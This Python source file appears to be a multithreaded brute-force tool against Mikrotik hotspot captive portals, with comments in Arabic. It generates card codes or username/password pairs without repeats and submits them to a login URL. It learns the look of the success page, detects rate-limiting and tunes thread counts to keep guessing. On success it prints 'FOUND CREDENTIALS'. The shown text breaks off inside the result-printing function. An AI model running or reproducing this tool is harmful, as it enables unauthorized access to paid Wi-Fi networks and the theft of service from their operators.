import os
import re
import sys
import json
import math
import time
import queue
import random
import threading
from copy import deepcopy
from random import choices
from collections import Counter
from datetime import datetime
from urllib.parse import urlparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

MAX_TRIES_PER_CARD = 3     # إعادات إضافية للكارت الواحد عند فشل الشبكة (★ v3.2)
NET_ERR_BURST    = 25      # عدد أخطاء الاتصال المتتالية قبل اعتبار الهدف مفقوداً
NET_SILENCE_SEC  = 6.0     # مدة الصمت الكامل (بدون أي رد HTTP) قبل الإجهاض
SLOW_DIAG_AFTER  = 8.0     # إذا تجاوز زمن الاستجابة هذا → وسم "slow" في الفحص
READ_TIMEOUT     = 8.0     # كان 4.0 → قصير جداً على راوتر مشغول أو RADIUS
CONNECT_TIMEOUT  = 3.0


if os.name == 'nt':
    os.system('')  
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
    sys.stdin.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

red    = '\033[1;31m'
green  = '\033[2;32m'
blue   = '\033[2;36m'
white  = '\033[1;37m'
yellow = '\033[1;33m'
purple = '\033[2;35m'
cyan   = '\033[1;96m'
gray   = '\033[2;37m'

try:
    SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
except NameError:
    SCRIPT_DIR = os.getcwd()
DB_FILE = os.path.join(SCRIPT_DIR, 'mikrotikbf_profiles.json')

HEADERS = {
    "User-Agent": ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                   "AppleWebKit/537.36 (KHTML, like Gecko) "
                   "Chrome/125.0.0.0 Safari/537.36"),
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9,ar;q=0.8",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
}

FAILURE_SIGNS = [
    'invalid username or password', 'wrong username or password',
    'login failed', 'failed to log in', 'access denied',
    'radius server is not responding', 'please log in', 'try again',
    'incorrect', 'authentication failed', 'cannot log in',
]

CHARSETS = {
    '1': '0123456789',
    '2': 'abcdefghijklmnopqrstuvwxyz',
    '3': '0123456789abcdefghijklmnopqrstuvwxyz',
}

def classify_error(exc):
    """يرجّع (kind, short_text)."""
    full = f'{type(exc).__name__}: {exc}'
    short = full if len(full) <= 160 else full[:157] + '...'
    txt = full.lower()

    if isinstance(exc, requests.exceptions.SSLError):
        return 'ssl', short
    if isinstance(exc, requests.exceptions.ProxyError):
        return 'proxy', short
    if isinstance(exc, requests.exceptions.ConnectTimeout):
        return 'connect_timeout', short
    if isinstance(exc, requests.exceptions.ReadTimeout):
        return 'read_timeout', short
    if isinstance(exc, requests.exceptions.Timeout):
        return 'timeout', short
    if isinstance(exc, requests.exceptions.ConnectionError):
        if ('remote end closed' in txt or 'connection aborted' in txt
                or 'remotedisconnected' in txt or 'protocolerror' in txt):
            return 'stale_keepalive', short
        if 'connection reset' in txt or 'reset by peer' in txt:
            return 'conn_reset', short
        if 'refused' in txt:
            return 'conn_refused', short
        if 'timed out' in txt:
            return 'conn_timeout', short
        if ('name resolution' in txt or 'nodename nor servname' in txt
                or 'name or service not known' in txt or 'getaddrinfo' in txt):
            return 'dns', short
        if 'no route to host' in txt or 'network is unreachable' in txt:
            return 'unreachable', short
        return 'conn_error', short
    if isinstance(exc, requests.exceptions.TooManyRedirects):
        return 'redirect_loop', short
    if isinstance(exc, requests.exceptions.RequestException):
        return 'request_error', short
    return 'other', short


ERROR_HINTS = {
    'stale_keepalive': ('السيرفر قفل اتصال keep-alive معاد استخدامه — '
                        'ليس حظراً وليس كارت منتهي (يُعاد تلقائياً)'),
    'conn_reset':      ('الراوتر قطع الاتصال (RST) — غالباً حد أقصى '
                        'لاتصالات سيرفر الـHTTP داخل المايكروتك'),
    'conn_refused':    ('المنفذ مغلق — hotspot http متوقف أو قاعدة drop'),
    'conn_timeout':    ('لا رد إطلاقاً — الواي فاي/الراوتر أو قاعدة إسقاط'),
    'read_timeout':    ('الراوتر تأخر في الرد — تحميل زائد أو RADIUS بطيء'),
    'connect_timeout': ('لا يمكن فتح اتصال TCP — الشبكة مقطوعة أو إسقاط'),
    'timeout':         ('مهلة عامة'),
    'dns':             ('تعذّر تحويل الاسم — الشبكة مقطوعة'),
    'unreachable':     ('لا مسار للمضيف — خرجت من شبكة الـhotspot'),
    'ssl':             ('مشكلة TLS — غالباً http ضد https'),
    'proxy':           ('تدخّل بروكسي'),
    'conn_error':      ('خطأ اتصال آخر'),
    'redirect_loop':   ('حلقة redirect'),
    'request_error':   ('خطأ طلب عام'),
    'other':           ('استثناء غير متوقع'),
}

def load_db():
    try:
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            data = json.load(f)
        if isinstance(data, dict) and isinstance(data.get('profiles'), list):
            return data
    except (FileNotFoundError, json.JSONDecodeError, OSError):
        pass
    return {'profiles': []}


def save_db(db):
    try:
        with open(DB_FILE, 'w', encoding='utf-8') as f:
            json.dump(db, f, indent=2, ensure_ascii=False)
        return True
    except OSError as e:
        print(f'{red} ✗ Cannot save database: {e}{white}')
        return False



def ask_int(prompt, default=None, minv=1, maxv=10_000_000_000):
    while True:
        raw = input(prompt).strip()
        if raw == '' and default is not None:
            return default
        try:
            v = int(raw)
            if minv <= v <= maxv:
                return v
        except ValueError:
            pass
        print(f'  {red}✗ Enter a number between {minv} and {maxv}.{white}')


def ask_yn(prompt, default_yes=False):
    d = 'Y/n' if default_yes else 'y/N'
    raw = input(f'{prompt} {green}[{d}]{white} : ').strip().lower()
    if raw == '':
        return default_yes
    return raw in ('y', 'yes', 'نعم', 'ي')


def normalize_url(u):
    u = u.strip()
    if u and not u.lower().startswith(('http://', 'https://')):
        u = 'http://' + u
    return u


def same_path(a, b):
    pa, pb = urlparse(a), urlparse(b)
    return (pa.netloc.lower(), pa.path) == (pb.netloc.lower(), pb.path)


def char_set(title):
    while True:
        c = input(f'''{yellow}
 Choose characters for the {title} :{white}
  1) only numbers   (0-9)
  2) only letters   (a-z)
  3) both           (0-9 a-z)
 >>> ''').strip()
        if c in CHARSETS:
            return CHARSETS[c]
        print(f'  {red}✗ Invalid choice (1/2/3).{white}')


_tls = threading.local()


def thread_session():
    s = getattr(_tls, 'session', None)
    if s is None:
        s = requests.Session()
        s.headers.update(HEADERS)
        _tls.session = s
    return s


def close_thread_session():
    s = getattr(_tls, 'session', None)
    if s is not None:
        try:
            s.close()
        except Exception:
            pass
        _tls.session = None


def test_connection(url, timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), tries=3):
    """
    ★ v3.2: إعادة محاولة عند إغلاق الراوتر للاتصال (RemoteDisconnected).
    كان طلب واحد فاشل عابر يُظهر 'Cannot reach target' ويوقف كل شيء
    رغم أن الراوتر يعمل — وهذا مصدر إنذارات كاذبة.
    """
    last = None
    for i in range(tries):
        s = requests.Session()
        s.headers.update(HEADERS)
        try:
            return s.get(url, timeout=timeout, verify=False, allow_redirects=True)
        except requests.exceptions.ConnectionError as e:
            last = e
            kind, _ = classify_error(e)
            if kind in ('stale_keepalive', 'conn_reset') and i < tries - 1:
                time.sleep(0.2 * (i + 1))
                continue
            raise
        finally:
            try:
                s.close()
            except Exception:
                pass
    if last:
        raise last
    raise requests.exceptions.ConnectionError('unreachable')

def _raw_send(s, p, u, pw, timeout):
    if p.get('method') == '2':  
        data = {p.get('user_field', 'username'): u}
        if pw is not None:                       
            data[p.get('pass_field', 'password')] = pw
        if p.get('extras'):
            data[p.get('dst_field', 'dst')] = ''
            data[p.get('popup_field', 'popup')] = 'true'
        return s.post(p['login_url'], data=data,
                      timeout=timeout, verify=False, allow_redirects=True)
    else:  
        params = {p.get('user_field', 'username'): u}
        if pw is not None:                        
            params[p.get('pass_field', 'password')] = pw
        if p.get('extras'):                      
            params[p.get('dst_field', 'dst')] = ''
            params[p.get('popup_field', 'popup')] = 'true'
        return s.get(p['login_url'], params=params,
                     timeout=timeout, verify=False, allow_redirects=True)


def send_login(p, u, pw, session=None,
               timeout=(CONNECT_TIMEOUT, READ_TIMEOUT), retry_stale=True):
    """
    ★ v3.1: يعيد المحاولة مرة واحدة عند خطأ 'الاتصال القديم'.
    هذا وحده يُسقط نسبة كبيرة من Err الوهمية في v3.0.
    متغيّر thread-local يسجّل أن إعادة محاولة حدثت (للتقرير).
    """
    s = session or thread_session()
    try:
        resp = _raw_send(s, p, u, pw, timeout)
        _tls.retried = False
        return resp
    except requests.exceptions.ConnectionError as e:
        kind, _ = classify_error(e)
        _tls.retried = False
        if retry_stale and kind in ('stale_keepalive', 'conn_reset'):
            close_thread_session()          
            s2 = session or thread_session()
            resp = _raw_send(s2, p, u, pw, timeout)   
            _tls.retried = True
            return resp
        raise



def is_successful(p, resp, keyword):
    try:
        url = (resp.url or '').lower()
        html = (resp.text or '').lower()
    except Exception:
        return False
    sig = p.get('success_signature')
    if sig:
        words = set(re.findall(r'[a-z]{3,}', html))
        hits = sum(1 for w in sig if w in words)
        if hits >= max(2, int(len(sig) * 0.4)):
            return True
    surl = p.get('success_url')
    if surl:
        a = urlparse(surl)
        if a.path not in ('', '/') and same_path(surl, resp.url or ''):
            return True
    if '/status' in url:
        return True
    for h in (getattr(resp, 'history', None) or []):
        if '/status' in (h.url or '').lower():
            return True
    for f in FAILURE_SIGNS:
        if f in html:
            return False
    kw = (keyword or '').strip().lower()
    if kw and (kw in html or kw in url):
        return True

    return False


def extract_signature(success_text, fail_text, limit=12):
    """كلمات موجودة في صفحة النجاح وغائبة عن صفحة الفشل"""
    fw = set(re.findall(r'[a-z]{3,}', (fail_text or '').lower()))
    seen = []
    for w in re.findall(r'[a-z]{3,}', (success_text or '').lower()):
        if w not in fw and w not in seen:
            seen.append(w)
        if len(seen) >= limit:
            break
    return seen

def learn_success_page(p):
    print(f'''
{cyan} ┌─ Teach SUCCESS page ────────────────────────┐{white}
 │ {gray}سجّل الآن ببيانات صحيحة تعرفها (حتى لو تجريبية)│
 │ {gray}ستتعلم الأداة شكل صفحة النجاح تلقائياً        │{white}
{cyan} └─────────────────────────────────────────────┘{white}''')

    u = input(' Known-good Username : ').strip()
    w = input(' Known-good Password : ').strip()
    if not u:
        print(f'{red} ✗ Cancelled.{white}')
        return False

    try:
        ok_resp = send_login(p, u, w, timeout=(4, 8))
    except Exception as e:
        kind, short = classify_error(e)
        print(f'{red} ✗ Request failed [{kind}]: {short}{white}')
        print(f'{gray}   → {ERROR_HINTS.get(kind, "")}{white}')
        return False
    bad = ''.join(choices('zqx9', k=12))
    try:
        bad_resp = send_login(p, bad, bad, timeout=(4, 8))
    except Exception:
        bad_resp = None

    sig = extract_signature(ok_resp.text,
                            bad_resp.text if bad_resp is not None else '')

    identical = (bad_resp is not None
                 and same_path(ok_resp.url or '', bad_resp.url or '')
                 and not sig)

    if identical:
        print(f'''{yellow}
 ⚠ Success & failure pages look IDENTICAL —
   cannot learn. سيتم الاعتماد على /status والكلمة المفتاحية.{white}''')
        return False

    p['success_url'] = ok_resp.url or ''
    if sig:
        p['success_signature'] = sig
        print(f'\n {green}✓ Learned! Signature words:{white} '
              f'{cyan}{", ".join(sig[:8])}{white}')
    else:
        print(f'\n {yellow}⚠ Saved success URL only (no signature words).{white}')
    print(f' {gray}Success URL: {p["success_url"]}{white}')
    return True

def ask_url_and_test(p):
    while True:
        raw = input(f'{white} → Login URL {green}(ex: http://10.5.50.1/login){white} : ')
        url = normalize_url(raw)
        if not url:
            continue
        print(f'{yellow} ⟳ Testing connection...{white}')
        t0 = time.time()
        try:
            r = test_connection(url)
            dt = (time.time() - t0) * 1000
            print(f'{green} ✓ Connected! (HTTP {r.status_code}, {dt:.0f} ms)'
                  f'{white}\n')
            p['login_url'] = url
            return True
        except Exception as e:
            kind, short = classify_error(e)
            print(f'{red} ✗ Connection failed [{kind}]: {short}{white}')
            print(f'{gray}   → {ERROR_HINTS.get(kind, "")}{white}')
            if not ask_yn(' Retry with another URL?', default_yes=True):
                return False


def ask_method_and_fields(p):
    print(f'''{yellow}
 ┌─────────────────────────────────────────────┐
 │  1) GET  → البيانات تظهر في الرابط          │
 │  2) POST → البيانات مخفية (الأحدث)          │
 │                                             │
 │  {gray}💡 لا تعرف؟ افتح صفحة login واضغط F12{yellow}    │
 │     {gray}وابحث عن <form method="..."{yellow}             │
 └─────────────────────────────────────────────┘{white}''')
    c = input(f'{white} → Method {green}(1/2, Enter=1){white} : ').strip()
    p['method'] = '2' if c == '2' else '1'

    if p['method'] == '2':
        p['user_field'] = input(f' → Username field {green}(Enter=username){white} : ').strip() or 'username'
        p['pass_field'] = input(f' → Password field {green}(Enter=password){white} : ').strip() or 'password'
        p['extras'] = ask_yn(' → Send Mikrotik hidden fields (dst/popup)?', default_yes=True)
        if p['extras']:
            p['dst_field']   = input(f' → dst field   {green}(Enter=dst){white}   : ').strip() or 'dst'
            p['popup_field'] = input(f' → popup field {green}(Enter=popup){white} : ').strip() or 'popup'
    else:
        p['extras'] = ask_yn(' → Also send dst/popup in the GET query?', default_yes=True)


def ask_network_shape(p):
    print(f'''{yellow}
 ┌─────────────────────────────────────────────┐
 │  1) username فقط (كارت/كود)                 │
 │  2) username = password                     │
 │  3) username + password مختلفان            │
 └─────────────────────────────────────────────┘{white}''')
    while True:
        nt = input(f'{white} → Type {green}(1/2/3){white} : ').strip()
        if nt in ('1', '2', '3'):
            break
        print(f'{red} ✗ Invalid.{white}')
    p['network_type'] = nt

    if nt in ('1', '2'):
        while True:
            cs = char_set('card/code')
            total_len = ask_int(' → Full card length : ', minv=1, maxv=64)
            pre = input(f' → Prefix   {green}(Enter if none){white} : ').strip()
            suf = input(f' → Suffix   {green}(Enter if none){white} : ').strip()
            var = total_len - len(pre) - len(suf)
            if var > 0:
                p.update(charset=cs, var_len=var, prefix=pre, suffix=suf)
                return
            print(f'{red} ✗ Prefix+Suffix أطول من الطول كله!{white}')
    else:
        for tag, key in (('username', 'u'), ('password', 'p')):
            while True:
                cs = char_set(tag)
                total_len = ask_int(f' → Full {tag} length : ', minv=1, maxv=64)
                pre = input(f' → {tag} prefix {green}(Enter if none){white} : ').strip()
                suf = input(f' → {tag} suffix {green}(Enter if none){white} : ').strip()
                var = total_len - len(pre) - len(suf)
                if var > 0:
                    p.update({f'{key}_charset': cs, f'{key}_len': var,
                              f'{key}_prefix': pre, f'{key}_suffix': suf})
                    break
                print(f'{red} ✗ Prefix+Suffix أطول من الطول!{white}')


def print_profile_summary(p):
    method = 'POST' if p.get('method') == '2' else 'GET'
    learned = 'Yes ✓' if (p.get('success_signature') or p.get('success_url')) else 'No'
    nt = p['network_type']
    if nt in ('1', '2'):
        full = p['var_len'] + len(p['prefix']) + len(p['suffix'])
        shape = f'card len={full}  [{p["prefix"]}…{p["suffix"]}]'
    else:
        uf = p['u_len'] + len(p['u_prefix']) + len(p['u_suffix'])
        pf = p['p_len'] + len(p['p_prefix']) + len(p['p_suffix'])
        shape = f'user len={uf} | pass len={pf}'
    print(f'''
 {white}╭──────────────────────────────────────────╮
 │ {cyan}URL     :{white} {p["login_url"]}
 │ {cyan}Method  :{white} {method}
 │ {cyan}Type    :{white} {nt}  ({shape})
 │ {cyan}Learned :{white} {learned}
 ╰──────────────────────────────────────────╯''')


def top_error(kinds):
    if not kinds:
        return ''
    k, n = kinds.most_common(1)[0]
    return f'{k}×{n}'

def _space_size(charset, n):
    """عدد كل الاحتمالات الممكنة = |الحروف| ^ الطول"""
    return max(1, len(charset) ** int(n))


def _decode_index(idx, charset, n):
    """يحوّل رقم الفهرس إلى نص: bijection بين [0, space) وكل النصوص."""
    base = len(charset)
    out = []
    for _ in range(int(n)):
        out.append(charset[idx % base])
        idx //= base
    return ''.join(out)


def _profile_space(p):
    """حجم فضاء الاحتمالات للبروفايل (كل الكروت/الأزواج الممكنة)."""
    if p.get('network_type') in ('1', '2'):
        return _space_size(p['charset'], p['var_len'])
    return (_space_size(p['u_charset'], p['u_len'])
            * _space_size(p['p_charset'], p['p_len']))


def _new_walk(space):
    """
    مشي دوري كامل: index(i) = (b + a*i) mod space
    بشرط gcd(a, space) = 1 → يمرّ على كل فهرس مرة واحدة بالضبط
    قبل أن يعود للبداية، وترتيبه مبعثر عشوائياً. الذاكرة O(1).
    """
    rnd = random.Random()
    a = 1
    if space > 2:
        while True:
            a = rnd.randrange(1, space)
            if math.gcd(a, space) == 1:
                break
    b = rnd.randrange(0, space) if space > 1 else 0
    return {'a': a, 'b': b, 'space': space, 'pos': 0, 'passes': 0}


def get_walk(p):
    """يرجّع (walk, space, note) ويحفظ الحالة داخل البروفايل."""
    space = _profile_space(p)
    w = p.get('walk')
    note = ''
    if (not isinstance(w, dict) or w.get('space') != space
            or not w.get('a') or not (0 <= int(w.get('pos', 0)) <= space)):
        w = _new_walk(space)
        note = 'new coverage pass'
    elif int(w.get('pos', 0)) >= space:
        passes = int(w.get('passes', 0)) + 1
        w = _new_walk(space)
        w['passes'] = passes
        note = f'full pass #{passes} completed — pass #{passes + 1} started'
    p['walk'] = w
    return w, space, note


def card_gen(p, walk, start_pos):
    """يولّد الكروت بلا أي تكرار داخل الجولة (عكس choices القديمة)."""
    nt = p.get('network_type')
    a, b, space = walk['a'], walk['b'], walk['space']
    if nt in ('1', '2'):
        cs, ln = p['charset'], p['var_len']
        pre, suf = p['prefix'], p['suffix']
        i = start_pos
        while True:
            idx = (b + a * i) % space
            card = pre + _decode_index(idx, cs, ln) + suf
            yield (card, card if nt == '2' else None)
            i += 1
    else:
        ucs, ulen = p['u_charset'], p['u_len']
        pcs, plen = p['p_charset'], p['p_len']
        upre, usuf = p['u_prefix'], p['u_suffix']
        ppre, psuf = p['p_prefix'], p['p_suffix']
        p_space = _space_size(pcs, plen)
        i = start_pos
        while True:
            idx = (b + a * i) % space
            uidx, pidx = divmod(idx, p_space)
            u = upre + _decode_index(uidx, ucs, ulen) + usuf
            w = ppre + _decode_index(pidx, pcs, plen) + psuf
            yield (u, w)
            i += 1


def fmt_int(n):
    return f'{n:,}'


def space_line(p, walk=None, space=None, sent=None):
    if space is None:
        space = _profile_space(p)
    if walk is None:
        walk = p.get('walk') or {}
    done = int(walk.get('pos', 0))
    done = min(done, space)
    txt = (f'Space: {fmt_int(space)} combos  |  '
           f'covered so far: {fmt_int(done)} ({done / space * 100:.1f}%)')
    if sent is not None:
        txt += f'  |  this run: {fmt_int(sent)} distinct'
    return txt

def progress_updater(shared, total, lock, stop_event, t0):
    announced = False
    while not stop_event.is_set():
        with lock:
            tested = shared['tested']
            errors = shared['errors']
            found  = shared['found']
            top    = top_error(shared['error_kinds'])
            una    = shared['unreachable']
        elapsed = time.time() - t0
        speed = tested / elapsed if elapsed > 0 else 0.0
        pct = min((tested / total * 100.0) if total > 0 else 100.0, 100.0)
        blocks = int(pct / 5)
        bar = '=' * blocks + '-' * (20 - blocks) 
        extra = f'  {red}top:{top}{white}' if top else ''
        print(f'\r {blue}[{bar}]{white} {pct:5.1f}%  {gray}|{white} '
              f'{tested}/{total}  {gray}|{white} Err:{errors}  '
              f'{gray}|{white} {speed:5.1f}/s {extra}   ',
              end='', flush=True)
        if found and not announced:
            announced = True
            print(f'\n\n {green}✓ MATCH FOUND — finishing...{white}\n')
        if una:
            print(f'\n\n {red}✗ TARGET UNREACHABLE — stopping...{white}\n')
            break
        time.sleep(0.08)



def attack(p, count, threads_count, keyword):
    lock = threading.Lock()
    stop_event = threading.Event()
    now = time.time()
    walk, space, walk_note = get_walk(p)
    start_pos = int(walk.get('pos', 0))
    remaining = max(space - start_pos, 0)
    effective = count if remaining <= 0 else min(count, remaining)
    capped = effective < count

    shared = {
        'tested': 0, 'errors': 0, 'found': False,
        'user': None, 'pw': None, 'elapsed': 0,
        'space': space, 'start_pos': start_pos, 'sent': 0,
        'effective': effective, 'capped': capped, 'walk_note': walk_note,
        'error_kinds': Counter(),
        'http_status': Counter(),
        'retried': 0,
        'requeued': 0,
        'failed_cards': 0,
        'responses': 0,
        'last_resp_ts': now,
        'err_since_resp': 0,
        'unreachable': False,
        'unreachable_kind': '',
        'unreachable_reason': '',
        'block_warn': False,
        'latencies': [],
    }
    def gen():
        return card_gen(p, walk, start_pos)

    def note_response(status):
        """رد HTTP وصل → الشبكة حيّة، نصفّر عدّاد الصمت."""
        with lock:
            shared['responses'] += 1
            shared['last_resp_ts'] = time.time()
            shared['err_since_resp'] = 0
            shared['http_status'][status] += 1
            if status in (403, 429) or 500 <= status < 600:
                hot = shared['http_status'][403] + shared['http_status'][429]
                hot += sum(v for k, v in shared['http_status'].items()
                           if 500 <= k < 600)
                if hot >= 5 and not shared['block_warn']:
                    shared['block_warn'] = True
                    print(f'\n {yellow}⚠ HTTP {status} seen {hot} times — '
                          f'possible blocking / rate-limit on the router.{white}\n')

    def note_error(kind):
        with lock:
            shared['error_kinds'][kind] += 1
            shared['err_since_resp'] += 1
            silent = time.time() - shared['last_resp_ts']
            never_answered = (shared['responses'] == 0
                              and shared['err_since_resp'] >= NET_ERR_BURST)
            went_silent = (shared['err_since_resp'] >= NET_ERR_BURST
                           and silent >= NET_SILENCE_SEC)
            if never_answered or went_silent:
                shared['unreachable'] = True
                shared['unreachable_kind'] = kind
                shared['unreachable_reason'] = ('never answered' if never_answered
                                                else f'silent for {silent:.0f}s')
                stop_event.set()

    def do_attempt(u, pw):
        """
        ★ v3.2: كارت فشل طلبه على مستوى الشبكة = لم يُجرَّب فعلاً،
        فنعيده في نفس الـthread (retry داخلي) حتى تكون "التغطية"
        حقيقية. الطابور المحدود كان يُسقط الإعادات عند امتلائه.
        """
        resp = None
        t0 = time.time()
        for tries in range(MAX_TRIES_PER_CARD + 1):
            try:
                resp = send_login(p, u, pw)
                break
            except Exception as e:
                resp = None
                kind, _ = classify_error(e)
                note_error(kind)
                with lock:
                    shared['errors'] += 1
                    shared['tested'] += 1
                    if tries > 0:
                        shared['requeued'] += 1
                if tries >= MAX_TRIES_PER_CARD or stop_event.is_set():
                    with lock:
                        if not stop_event.is_set():
                            shared['failed_cards'] += 1
                    return
                time.sleep(0.05 * (tries + 1))
        if resp is None:
            return
        dt = time.time() - t0
        with lock:
            shared['latencies'].append(round(dt * 1000))
            if getattr(_tls, 'retried', False):
                shared['retried'] += 1
        note_response(getattr(resp, 'status_code', 0))

        ok = False
        if not stop_event.is_set():
            ok = is_successful(p, resp, keyword)
        if ok:
            with lock:
                if not shared['found']:
                    shared['found'] = True
                    shared['user'], shared['pw'] = u, pw
                    stop_event.set()
        with lock:
            shared['tested'] += 1

    def worker():
        while True:
            try:
                u, pw = task_q.get(timeout=0.25)
            except queue.Empty:
                if stop_event.is_set():
                    return
                continue
            try:
                if not stop_event.is_set():
                    do_attempt(u, pw)
            finally:
                task_q.task_done() 

    method_txt = 'POST' if p.get('method') == '2' else 'GET'
    print(f'''{gray}
 ─────────────────────────────────────────────
 {white}Target: {p["login_url"]}  {gray}|{white} {method_txt}  {gray}|{white}
 {white}Threads: {threads_count}  {gray}|{white} Attempts: {count}
 {white}{space_line(p, walk, space, effective)}{white}
 ─────────────────────────────────────────────{white}''')
    if walk_note:
        print(f' {cyan}↻ {walk_note}{white}')
    if capped:
        print(f''' {yellow}⚠ الفضاء كله {fmt_int(space)} احتمال فقط — تم تحديد الجولة
   بـ {fmt_int(effective)} محاولة لتغطية كل الاحتمالات بلا تكرار
   (المحاولات الزائدة كانت ستكرر نفس الكروت).{white}''')
    if space <= 10 ** 6:
        print(f' {green}✓ هذه الجولة تغطي '
              f'{min(100.0, effective / max(space - start_pos, 1) * 100):.1f}% '
              f'من الاحتمالات المتبقية — بدون أي تكرار.{white}')

    t0 = time.time()
    prog = threading.Thread(target=progress_updater,
                            args=(shared, effective, lock, stop_event, t0),
                            daemon=True)
    prog.start()

    task_q = queue.Queue(maxsize=max(10, threads_count * 2))

    workers = [threading.Thread(target=worker, daemon=True)
               for _ in range(threads_count)]
    for w in workers:
        w.start()

    g = gen()
    sent = 0
    try:
        while sent < effective and not stop_event.is_set():
            u, pw = next(g)
            task_q.put((u, pw))  
            sent += 1
    except KeyboardInterrupt:
        stop_event.set()
        print(f'\n {yellow}✋ Stopped by user.{white}')
    finally:
        try:
            task_q.join()         
        except KeyboardInterrupt:
            stop_event.set()
        stop_event.set()
    walk['pos'] = min(start_pos + sent, space)
    shared['sent'] = sent
    shared['walk'] = walk
    shared['elapsed'] = time.time() - t0
    print()
    return shared

def print_error_report(shared, threads_count):
    tested = max(shared['tested'], 1)
    errs = shared['errors']
    rate = errs / tested * 100.0
    kinds = shared['error_kinds']

    print(f'{gray} ─────────────────────────────────────────────{white}')
    print(f' {cyan}ERROR BREAKDOWN{white}  '
          f'({errs} of {shared["tested"]} = {rate:.1f}%)')

    if not errs:
        print(f' {green}✓ No connection errors at all.{white}')
    else:
        for kind, n in kinds.most_common():
            share = n / errs * 100.0
            print(f'   {yellow}{kind:<16}{white} {n:>7}  ({share:4.1f}%)  '
                  f'{gray}{ERROR_HINTS.get(kind, "")}{white}')

    if shared['retried']:
        print(f' {green}↻ {shared["retried"]} stale connections were '
              f'auto-retried (would have been counted as errors in v3.0).{white}')
    if shared.get('requeued'):
        print(f' {green}↻ {shared["requeued"]} كارت فشل طلبه على مستوى الشبكة '
              f'أُعيد إرساله حتى لا تُحسب تغطية وهمية.{white}')

    if shared['http_status']:
        codes = ', '.join(f'{c}×{n}' for c, n
                          in shared['http_status'].most_common(6))
        print(f' {gray}HTTP status codes seen: {codes}{white}')

    lat = shared['latencies']
    if lat:
        lat_sorted = sorted(lat)
        avg = sum(lat) / len(lat)
        p95 = lat_sorted[min(len(lat_sorted) - 1, int(len(lat_sorted) * 0.95))]
        print(f' {gray}Latency: avg {avg:.0f} ms | p95 {p95} ms | '
              f'max {lat_sorted[-1]} ms{white}')

    print(f'\n {cyan}VERDICT{white}')
    if shared['unreachable']:
        topk = ''
        if kinds:
            topk = kinds.most_common(1)[0][0]
        if topk in ('read_timeout', 'connect_timeout', 'conn_timeout', 'timeout'):
            why = (f'الهدف توقف عن الرد كلياً '
                   f'({shared.get("unreachable_reason", "")}). '
                   f'كل الأخطاء كانت مهلات → إمّا الرابط انقطع، أو الراوتر لم يعد '
                   f'يستطيع اللحاق بـ {threads_count} thread.')
        else:
            why = (f'الهدف توقف عن الرد كلياً '
                   f'({shared.get("unreachable_reason", "")}). '
                   f'الشبكة/الراوتر لم يعد يُرى — خرجت من مدى الواي فاي، أو قاعدة '
                   f'firewall تسقط جهازك.')
        print(f''' {red}✗ The target stopped answering — the run was aborted.
   آخر خطأ: {shared["unreachable_kind"]}  |  {shared["err_since_resp"]} خطأ متتالٍ
   {why}
   ليس كارت منتهي وليس كلمة مرور خاطئة. تحقّق: هل ما زلت على نفس
   الشبكة؟ ثم أعد القياس من Menu 4 قبل أي تخمين.{white}''')
    elif rate >= 60 and shared['responses'] == 0:
        print(f''' {red}✗ Not a single HTTP response was received.
   كل الطلبات فشلت على مستوى الاتصال. راجع الرابط أولاً (Menu 4)،
   وليس الكروت.{white}''')
    elif kinds and kinds.most_common(1)[0][1] / max(errs, 1) >= 0.5:
        topk = kinds.most_common(1)[0][0]
        if topk in ('stale_keepalive',):
            print(f''' {yellow}▲ Most errors were stale keep-alive connections.
   الراوتر يقفل الاتصالات المعاد استخدامها. الأثر الأصلي للخطأ صفر تقريباً
   الآن (يُعاد تلقائياً) — لكن إن أردت تقليلها: قلّل الـThreads إلى 20-40
   أو اجعل الهيدر Connection: close عبر إضافة صغيرة في HEADERS.{white}''')
        elif topk in ('read_timeout', 'conn_timeout', 'timeout'):
            rec = max(4, min(threads_count // 2, 40))
            print(f''' {yellow}▲ Errors are timeouts → the router is overloaded.
   {threads_count} thread على راوتر بيتي = ضغط زائد، والنتيجة بطء وأخطاء
   أكثر لا سرعة أعلى. جرّب {rec} thread وقارن (Menu 4 يعمل المقارنة
   تلقائياً).{white}''')
        elif topk in ('conn_reset', 'conn_refused'):
            print(f''' {yellow}▲ Connections are being reset/refused by the router.
   غالباً حد اتصالات سيرفر الـHTTP داخل المايكروتك، أو جهاز وسيط/AP.
   جرّب threads أقل + مسافة صغيرة بين الطلبات.{white}''')
        elif topk in ('unreachable', 'dns', 'conn_error'):
            print(f''' {red}▲ Network-level failures dominate — الشبكة غير مستقرة.
   الأخطاء هنا ليست دليل حظر من المايكروتك، بل دليل أن المسار للراوتر
   غير موثوق من جهازك.{white}''')
        else:
            print(f' {yellow}▲ Top error: {topk}. '
                  f'{ERROR_HINTS.get(topk, "")}{white}')
    elif rate >= 10:
        print(f''' {yellow}▲ Error rate {rate:.1f}% is high for a healthy hotspot.
   القاعدة العملية: أقل من 2% مقبول، 2-10% يحتاج تقليل threads،
   أكثر من 10% يعني الشبكة أو الراوتر تحت ضغط حقيقي.{white}''')
    else:
        print(f' {green}✓ Error rate looks healthy ({rate:.1f}%).{white}')

    if shared['block_warn']:
        print(f' {red}⚠ 403/429/5xx responses appeared repeatedly — '
              f'that is the shape of server-side protection (or a captive '
              f'portal restarting), not of expired cards.{white}')
    if shared['error_kinds'].get('stale_keepalive'):
        print(f' {gray}Note: expired cards / wrong codes produce a NORMAL HTTP '
              f'page ("invalid username or password") and count as tested, '
              f'NOT as errors. So Err:N can never mean "expired cards".{white}')


def show_result(shared, p, threads_count):
    e = int(shared.get('elapsed', 0))
    mins, secs = divmod(e, 60)

    if shared['found']:
        u, pw = shared['user'], shared['pw']
        print(f'''
 {green}╔══════════════════════════════════════════╗
 ║        ✓ SUCCESS — FOUND CREDENTIALS     ║
 ╚══════════════════════════════════════════╝{white}
   {cyan}Target   :{white} {p["login_url"]}''')
        if p['network_type'] == '3':
            print(f'   {cyan}Username :{green} {u}'
                  f'\n   {cyan}Password :{green} {pw}')
